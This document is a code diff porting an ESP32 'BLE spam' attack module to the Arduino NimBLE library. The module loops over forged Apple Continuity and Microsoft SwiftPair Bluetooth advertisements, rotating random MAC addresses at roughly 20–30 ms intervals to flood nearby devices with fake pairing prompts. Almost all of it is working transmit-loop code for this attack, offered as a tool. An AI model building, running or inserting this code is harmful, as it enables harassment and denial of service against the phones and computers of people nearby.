@@ -9,19 +9,14 @@
  *   Microsoft SwiftPair- @Willy-JL, @Spooks4576
  */
 
-#include "attacks/ble/ble_spam.h"
-#include "managers/ble_manager.h"
-#include "managers/rgb_manager.h"
-#include "managers/status_display_manager.h"
-#include "core/glog.h"
+#include "ble_spam.h"
+#include <Arduino.h>
+#include <NimBLEDevice.h>
 #include "esp_random.h"
 #include "freertos/semphr.h"
-#include "host/ble_gap.h"
-#include "host/ble_hs.h"
-#include "nimble/ble.h"
+#include <string.h>
 #include <string.h>
 
-extern RGBManager_t rgb_manager;
 
 // ============================================================================
 // Apple Continuity — device models and action types
@@ -572,7 +567,7 @@ static size_t build_swiftpair_adv(uint8_t *buf) {
 
 static void spam_log_timer_cb(TimerHandle_t xTimer) {
     (void)xTimer;
-    glog("BLE Spam (%s): %lu packets sent\n",
+    Serial.printf("BLE Spam (%s): %lu packets sent\n",
          spam_type_to_name(current_spam_type),
          (unsigned long)spam_adv_count);
 }
@@ -586,8 +581,9 @@ static void spam_task(void *arg) {
 
     while (spam_running) {
         // --- Stop any active advertisement ---
-        if (ble_gap_adv_active()) {
-            ble_gap_adv_stop();
+        NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
+        if (pAdvertising->isAdvertising()) {
+            pAdvertising->stop();
             vTaskDelay(pdMS_TO_TICKS(20));
         }
 
@@ -598,7 +594,7 @@ static void spam_task(void *arg) {
             generate_random_mac(rnd_addr);
             int rc = ble_hs_id_set_rnd(rnd_addr);
             if (rc != 0) {
-                glog("Warning: Failed to set random address (%d)\n", rc);
+                Serial.printf("Warning: Failed to set random address (%d)\n", rc);
             }
         }
 
@@ -675,48 +671,29 @@ static void spam_task(void *arg) {
         }
 
         // --- Set advertisement data ---
-        int rc = ble_gap_adv_set_data(adv_data, adv_len);
-        if (rc != 0) {
-            glog("Error: Failed to set adv data (%d)\n", rc);
-            vTaskDelay(pdMS_TO_TICKS(50));
-            continue;
-        }
+        NimBLEAdvertisementData advDataObj;
+        advDataObj.addData(std::string((char*)adv_data, adv_len));
+        pAdvertising->setAdvertisementData(advDataObj);
+        pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
 
-        // --- Configure advertisement parameters ---
-        struct ble_gap_adv_params adv_params;
-        memset(&adv_params, 0, sizeof(adv_params));
-        adv_params.conn_mode  = BLE_GAP_CONN_MODE_NON;
-        adv_params.disc_mode  = is_apple ? BLE_GAP_DISC_MODE_GEN : BLE_GAP_DISC_MODE_NON;
-        adv_params.channel_map = 0x07; // all three channels
-
-        // Interval: use 20ms equivalent (0x20 = 20*0.625ms = 12.5ms, close enough)
-        // Apple uses slightly slower interval — it doesn't care about speed as much
         if (is_apple) {
-            adv_params.itvl_min = 0x30; // ~30ms
-            adv_params.itvl_max = 0x40;
+            pAdvertising->setMinInterval(0x30);
+            pAdvertising->setMaxInterval(0x40);
         } else {
-            adv_params.itvl_min = 0x20; // ~20ms
-            adv_params.itvl_max = 0x28;
+            pAdvertising->setMinInterval(0x20);
+            pAdvertising->setMaxInterval(0x28);
         }
 
-        uint8_t own_addr_type = is_apple ? BLE_OWN_ADDR_PUBLIC : BLE_OWN_ADDR_RANDOM;
+        NimBLEDevice::setOwnAddrType(is_apple ? BLE_OWN_ADDR_PUBLIC : BLE_OWN_ADDR_RANDOM);
 
-        // Advertise for a short window then rotate
-        uint32_t adv_ms = is_apple ? 200 : ((esp_random() % 50) + 50);
-        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms, &adv_params, NULL, NULL);
-        if (rc != 0) {
-            glog("Error: Failed to start adv (%d)\n", rc);
-            vTaskDelay(pdMS_TO_TICKS(50));
-            continue;
-        }
-
+        pAdvertising->start();
         spam_adv_count++;
 
-        // Wait for advertisement window to expire
+        uint32_t adv_ms = is_apple ? 200 : ((esp_random() % 50) + 50);
         vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));
 
-        if (ble_gap_adv_active()) {
-            ble_gap_adv_stop();
+        if (pAdvertising->isAdvertising()) {
+            pAdvertising->stop();
         }
 
         // Short idle before next packet — mimic 20ms Flipper default
@@ -724,8 +701,8 @@ static void spam_task(void *arg) {
         vTaskDelay(pdMS_TO_TICKS(idle_ms));
     }
 
-    if (ble_is_initialized() && ble_gap_adv_active()) {
-        ble_gap_adv_stop();
+    if (NimBLEDevice::getInitialized() && NimBLEDevice::getAdvertising()->isAdvertising()) {
+        NimBLEDevice::getAdvertising()->stop();
     }
 
     if (spam_task_handle == xTaskGetCurrentTaskHandle()) {
@@ -745,7 +722,7 @@ static void spam_task(void *arg) {
 
 void ble_spam_start(ble_spam_type_t type) {
     if (spam_running) {
-        glog("Spam already running, stopping first...\n");
+        Serial.println("Spam already running, stopping first...");
         ble_spam_stop();
     }
 
@@ -763,10 +740,8 @@ void ble_spam_start(ble_spam_type_t type) {
         (void)xSemaphoreTake(spam_task_exit_sem, 0);
     }
 
-    if (!ble_is_initialized()) ble_init();
-    if (!ble_wait_for_ready()) {
-        glog("BLE not ready for spam\n");
-        return;
+    if (!NimBLEDevice::getInitialized()) {
+        NimBLEDevice::init("");
     }
 
     current_spam_type = type;
@@ -775,7 +750,7 @@ void ble_spam_start(ble_spam_type_t type) {
 
     BaseType_t res = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle);
     if (res != pdPASS) {
-        glog("Failed to create spam task (%d)\n", res);
+        Serial.printf("Failed to create spam task (%d)\n", res);
         spam_running     = false;
         spam_task_handle = NULL;
         return;
@@ -793,8 +768,7 @@ void ble_spam_start(ble_spam_type_t type) {
         esp_timer_start_periodic(spam_log_timer, (uint64_t)spam_log_interval_ms * 1000);
     }
 
-    glog("BLE Spam started (%s)\n", spam_type_to_name(type));
-    status_display_show_status("BLE Spam On");
+    Serial.printf("BLE Spam started (%s)\n", spam_type_to_name(type));
 }
 
 void ble_spam_stop(void) {
@@ -809,8 +783,8 @@ void ble_spam_stop(void) {
         esp_timer_stop(spam_log_timer);
     }
 
-    if (ble_is_initialized() && ble_gap_adv_active()) {
-        ble_gap_adv_stop();
+    if (NimBLEDevice::getInitialized() && NimBLEDevice::getAdvertising()->isAdvertising()) {
+        NimBLEDevice::getAdvertising()->stop();
     }
 
     if (task_was_running) {
@@ -822,14 +796,13 @@ void ble_spam_stop(void) {
         }
 
         if (!task_exited && spam_task_handle != NULL && eTaskGetState(spam_task_handle) != eDeleted) {
-            glog("BLE spam task exit timed out, forcing stop\n");
+            Serial.println("BLE spam task exit timed out, forcing stop");
             vTaskDelete(spam_task_handle);
             spam_task_handle = NULL;
         }
     }
 
-    glog("BLE Spam stopped\n");
-    status_display_show_status("BLE Spam Off");
+    Serial.println("BLE Spam stopped");
 }
 
 bool ble_spam_is_running(void) {
